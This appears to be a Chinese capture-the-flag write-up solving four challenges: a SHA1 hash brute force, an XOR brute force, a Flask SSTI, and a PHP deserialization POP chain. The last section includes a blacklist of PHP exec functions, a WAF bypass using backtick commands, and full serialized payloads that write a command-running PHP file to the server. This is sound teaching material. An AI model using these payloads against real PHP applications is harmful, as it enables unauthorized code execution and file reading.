# 排名及得分

----

![](https://blog.chrizsty.cn/wp-content/uploads/2025/01/chrizsty比赛排名及得分.png)

----

# 通往哈希的旅程

----

1. **审题**

   ```
   在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串"ca12fd8250972ec363a16593356abb1f3cf3a16d"，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）
   ```

   * `以188开头的11位纯血号码`，确定了flag是由188开头的11位数字
   * `ca12fd8250972ec363a16593356abb1f3cf3a16d`，根据题目语言描述可能是哈希值

2. **爆破**

   用python代码强行爆破，代码如下

   ```python
   import hashlib
   
   def find_original_number(target_hash):
       # 遍历所有以188开头的11位数字
       for num in range(18800000000, 18900000000):
           # 将数字转换为字符串
           num_str = str(num)
           # 对号码进行SHA1加密
           hashed = hashlib.sha1(num_str.encode()).hexdigest()
           # 比较哈希值
           if hashed == target_hash:
               return num_str
       return None
   
   # 已知的目标哈希值
   target = "ca12fd8250972ec363a16593356abb1f3cf3a16d"
   result = find_original_number(target)
   if result:
       print(f"flag{{{result}}}")
   else:
       print("No match found.")
   ```

   得到结果

   ![image-20250117143237856](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117143237856.png)flag：`flag{18876011645}`
----
# 简单算术

----

1. **寻找切入点**

   * 题目提示“想想异或”
   * 文件中为`ys~xdg/m@]mjkz@vl@z~lf>b`，存在非法字符

2. **异或加密爆破**

   使用[CyberChef](https://github.com/gchq/CyberChef)进行爆破

   ![image-20250117144408554](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117144408554.png)

   得到flag：`flag{x0r_Brute_is_easy!}`
----
# easy_flask

----

1. **尝试找切入点**

   已知的线索有：

   * 题目提示的flask

   当进入靶场后，按提示输入username

   ![image-20250117140128674](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117140128674.png)

   再次尝试一堆乱起八糟的东西

   ![image-20250117140402854](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117140402854.png)

   甚至php代码

   ![image-20250117140530275](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117140530275.png)

   都是被完整输出。

   ----

   **结合题目给的提示**，这是一个web应用框架，到此为止，可以往**SSTI注入**方向考虑

2. **payload构造**

   * 在[Hackbar](https://chromewebstore.google.com/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc)中选用ssti模板

     ![image-20250117141313359](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117141313359.png)

     发现flag在网站根目录下

   * 更改命令为`cat flag`

     ![image-20250117141437087](https://blog.chrizsty.cn/wp-content/uploads/2025/01/image-20250117141437087.png)

     拿到flag：`flag{48ad0cde8345c8b2608933ac4e85147e}`

----



# easy_ser

----

1. **审计代码**

   ```php
   <?php
   //error_reporting(0);
   function PassWAF1($data){
       $BlackList = array("eval", "system", "popen", "exec", "assert", "phpinfo", "shell_exec",  "pcntl_exec", "passthru", "popen", "putenv");
       foreach ($BlackList as $value) {
           if (preg_match("/" . $value . "/im", $data)) {
               return true;
           }
       }
       return false;
   }
   
   function PassWAF2($str){
       $output = '';
       $count = 0;
       foreach (str_split($str, 16) as $v) {
           $hex_string = implode(' ', str_split(bin2hex($v), 4));
           $ascii_string = '';
           foreach (str_split($v) as $c) {
               $ascii_string .= (($c < ' ' || $c > '~') ? '.' : $c);
           }
           $output .= sprintf("%08x: %-40s %-16s\n", $count, $hex_string, $ascii_string);
           $count += 16;
       }
       return $output;
   }
   
   function PassWAF3($data){
       $BlackList = array("\.\.", "\/");
       foreach ($BlackList as $value) {
           if (preg_match("/" . $value . "/im", $data)) {
               return true;
           }
       }
       return false;
   }
   
   function Base64Decode($s){
       $decodeStr = base64_decode($s);
       if (is_bool($decodeStr)) {
           echo "gg";
           exit(-1);
       }
       return $decodeStr;
   }
   
   class STU{
   
       public $stu;
       public function __construct($stu){
           $this->stu = $stu;
       }
   
       public function __invoke(){
           echo $this->stu;
       }
   }
   
   
   class SDU{
       public $Dazhuan;
   
       public function __wakeup(){
           $Dazhuan = $this->Dazhuan;
           $Dazhuan();
       }
   }
   
   
   class CTF{
       public $hackman;
       public $filename;
   
       public function __toString(){
   
           $data = Base64Decode($this->hackman);
           $filename = $this->filename;
   
           if (PassWAF1($data)) {
               echo "so dirty";
               return;
           }
           if (PassWAF3($filename)) {
               echo "just so so?";
               return;
           }
   
           file_put_contents($filename, PassWAF2($data));
           echo "hack?";
           return "really!";
       }
   
       public function __destruct(){
           echo "bye";
       }
   }
   
   $give = $_POST['data'];
   if (isset($_POST['data'])) {
       unserialize($give);
   } else {
       echo "<center>听说pop挺好玩的</center>";
       highlight_file(__FILE__);
   }
   ```

   根据题目提示**反序列化**，以及看到一些魔术方法，这里依次解释

   ```
   __invoke()		//作为函数时会执行
   __wakeup()		//反序列化时自动执行
   __toString()	//作为字符串时执行
   ```

   我们拆开来看

   * 第一步

     ```php
     class SDU{
         public $Dazhuan;
     
         public function __wakeup(){
             $Dazhuan = $this->Dazhuan;
             $Dazhuan();
         }
     }
     ```

     需要一个值$Dazhuan会将其作为函数执行，正好对应__invoke()

   * 第二步

     ```php
     class STU{
     
         public $stu;
         public function __construct($stu){
             $this->stu = $stu;
         }
     
         public function __invoke(){
             echo $this->stu;
         }
     }
     ```

     需要一个值$stu会将其作为字符串用echo输出，正好对应__toString()

   * 第三步

     ```php
     class CTF{
         public $hackman;
         public $filename;
     
         public function __toString(){
     
             $data = Base64Decode($this->hackman);
             $filename = $this->filename;
     
             if (PassWAF1($data)) {
                 echo "so dirty";
                 return;
             }
             if (PassWAF3($filename)) {
                 echo "just so so?";
                 return;
             }
     
             file_put_contents($filename, PassWAF2($data));
             echo "hack?";
             return "really!";
         }
     
         public function __destruct(){
             echo "bye";
         }
     }
     ```

     得到$hackman，$hackman两个变量，并执行function __toString()

2. **构造pop链和payload**

   * 构造payload

     在**function __toString()**中有两个值：

     $data是经过Base64Decode()加密一次，而$filename直接由$filename获得

     **$data**会被PassWAF1()过滤一次，**$filename**会被PassWAF3()过滤一次

     然后会将**$data**经过PassWAF2()执行一次后放入**$filename**里，即一个复杂的文件上传

   * 构造pop链

     由上述分析，可以倒着构造，即

     ```php
     // 构造 payload
     $payload = new CTF();
     $payload->hackman = base64_encode("传入文件的内容");
     $payload->filename = '5.php';
     $a=new STU($payload);
     $b=new SDU();
     $b->Dazhuan=$a;
     
     // 序列化
     $serialized_payload = serialize($b);
     echo $serialized_payload;
     ```

   * 绕过waf

     由于waf2会将$data每16位切分一次，且waf1不允许出现系统执行函数

     所以需要特殊方法绕过，

     可以用反引号`执行命令来绕过waf1；

     写简短命令避免waf2

   到此为止，可以构造简单的命令

   ```php
   <?php `ls / >1`;		//确定flag在根目录下
   <?php `nl /*>1`;	//读取payload
   ```

   所以解题payload可以按下面步骤执行

   ```
   1.
   POST：data=O:3:"SDU":1:{s:7:"Dazhuan";O:3:"STU":1:{s:3:"stu";O:3:"CTF":2:{s:7:"hackman";s:24:"PD9waHAgYGxzIC8gPjFgOw==";s:8:"filename";s:5:"5.php";}}}
   2.
   访问http://url/5.php	//第一次执行命令
   3.
   访问http://url/1		//知道flag在根目录下
   4.
   POST：data=O:3:"SDU":1:{s:7:"Dazhuan";O:3:"STU":1:{s:3:"stu";O:3:"CTF":2:{s:7:"hackman";s:24:"PD9waHAgYG5sIC8qPjFgOw==";s:8:"filename";s:5:"5.php";}}}
   5.
   访问http://url/5.php	//执行新命令
   6.
   访问访问http://url/1	//拿到flag
   ```

   flag为：

   ```
   flag{f44ab7d7195a1f156aa2fbc1ceba61ec}
   ```